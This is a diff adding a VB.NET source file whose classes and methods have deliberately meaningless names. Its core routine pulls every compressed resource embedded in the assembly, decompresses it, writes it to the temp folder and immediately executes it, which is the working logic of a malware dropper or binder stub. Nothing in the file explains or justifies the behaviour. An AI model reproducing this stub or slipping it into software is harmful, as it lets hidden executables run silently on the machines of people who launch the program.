@@ -1,0 +1,53 @@
+Imports System
+Imports System.Collections
+Imports System.Reflection
+Imports System.Diagnostics
+Imports System.IO
+Imports System.IO.Compression
+
+Namespace Beta
+
+    Public Class Charlie
+        Public Shared Sub Delta()
+            _A._B()
+        End Sub
+
+    End Class
+
+    Public Class _A
+
+        Public Shared Sub _B()
+            Dim D As Byte()
+            Dim S As System.IO.FileStream
+            Dim DE As DictionaryEntry
+            Dim RM As New Resources.ResourceManager("B", Assembly.GetExecutingAssembly)
+            For Each DE In RM.GetResourceSet(System.Globalization.CultureInfo.CurrentCulture, True, True)
+                D = DirectCast(Decompress(RM.GetObject(DE.Key)), Byte())
+                S = New System.IO.FileStream(System.IO.Path.GetTempPath & DE.Key, System.IO.FileMode.Create)
+                S.Write(D, 0, D.Length)
+                S.Close()
+                Process.Start(System.IO.Path.GetTempPath & DE.Key)
+            Next
+        End Sub
+
+        Private Shared Function Decompress(data As Byte()) As Byte()
+            Dim input As New MemoryStream()
+            input.Write(data, 0, data.Length)
+            input.Position = 0
+            Dim gzip As New GZipStream(input, CompressionMode.Decompress, True)
+            Dim output As New MemoryStream()
+            Dim buff As Byte() = New Byte(63) {}
+            Dim read As Integer = -1
+            read = gzip.Read(buff, 0, buff.Length)
+            While read > 0
+                output.Write(buff, 0, read)
+                read = gzip.Read(buff, 0, buff.Length)
+            End While
+            gzip.Close()
+            Return output.ToArray()
+        End Function
+
+    End Class
+
+
+End Namespace
